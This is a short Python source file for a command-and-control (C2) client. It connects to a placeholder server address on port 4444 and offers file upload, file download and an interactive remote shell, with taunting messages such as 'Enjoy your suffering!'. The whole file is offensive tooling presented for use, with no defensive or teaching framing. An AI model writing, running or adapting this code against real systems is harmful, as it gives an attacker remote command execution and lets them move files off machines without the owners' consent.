import socket
import os

class C2Client:
    def __init__(self, host='YOUR_SERVER_IP', port=4444):
        self.host = host
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.host, self.port))
        print("[*] Connected to C2 Server. Enjoy your suffering! 😈")

    def send_command(self, command):
        self.client.send(command.encode())
        response = self.client.recv(4096).decode()
        print(response)
        return response

    def upload_file(self, file_path):
        self.client.send(b"upload")
        self.client.recv(1024)  # Wait for server to ask for file path
        self.client.send(file_path.encode())
        with open(file_path, 'rb') as f:
            while True:
                data = f.read(1024)
                if not data:
                    self.client.send(b"EOF")
                    break
                self.client.send(data)
        print(f"[*] File {file_path} uploaded. 😈")

    def download_file(self, file_path):
        self.client.send(b"download")
        self.client.recv(1024)  # Wait for server to ask for file path
        self.client.send(file_path.encode())
        with open(file_path, 'wb') as f:
            while True:
                data = self.client.recv(1024)
                if data.endswith(b"EOF"):
                    f.write(data[:-3])
                    break
                f.write(data)
        print(f"[*] File {file_path} downloaded. 😈")

    def shell(self):
        self.client.send(b"shell")
        print("[*] Shell mode activated. Type 'exit' to quit. 🐍")
        while True:
            cmd = input("shell> ")
            if cmd.lower() == "exit":
                self.client.send(b"exit")
                break
            self.client.send(cmd.encode())
            output = self.client.recv(4096).decode()
            print(output)

if __name__ == "__main__":
    client = C2Client()
    while True:
        command = input("C2> ")
        if command.lower() == "exit":
            client.send_command("exit")
            break
        elif command.lower() == "shell":
            client.shell()
        elif command.lower().startswith("upload "):
            file_path = command.split(" ")[1]
            client.upload_file(file_path)
        elif command.lower().startswith("download "):
            file_path = command.split(" ")[1]
            client.download_file(file_path)
        else:
            client.send_command(command)
